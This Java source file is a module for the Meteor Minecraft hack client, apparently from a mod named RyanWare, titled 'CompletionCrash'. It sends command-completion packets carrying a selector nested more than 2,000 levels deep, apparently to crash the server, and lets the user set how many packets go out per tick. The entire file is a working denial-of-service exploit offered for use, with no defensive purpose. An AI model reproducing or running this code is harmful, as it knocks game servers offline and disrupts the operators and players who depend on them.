package smilerryan.ryanware.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import smilerryan.ryanware.RyanWare;
import meteordevelopment.meteorclient.settings.BoolSetting;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CompletionCrash extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("Rate");

    public CompletionCrash() {
        super(RyanWare.CATEGORY, RyanWare.modulePrefix_extras + "Completion-Crash", "Funny Completion");
    }

    private int length = 2032;

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("Packets per tick")
        .description("Amount of packets sent each tick")
        .defaultValue(3)
        .min(2)
        .sliderMax(12)
        .build()
    );

    private final Setting<Boolean> autoToggle = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-toggle")
        .description("Automatically toggles off after sending the packets.")
        .defaultValue(true)
        .build()
    );

    @EventHandler
    private void onTick(TickEvent.Post event) {

        String overflow = generateJsonObject(length);
        String message = "msg @a[nbt={PAYLOAD}]";
        String partialCommand = message.replace("{PAYLOAD}", overflow);
        for (int i = 0; i < packets.get(); i++) {
            MinecraftClient.getInstance().player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }

        if (autoToggle.get()) { this.toggle(); }
        
    }

    private String generateJsonObject(int levels) {
        String in = IntStream.range(0, levels)
            .mapToObj(i -> "[")
            .collect(Collectors.joining());
        return "{a:" + in + "}";
    }
}
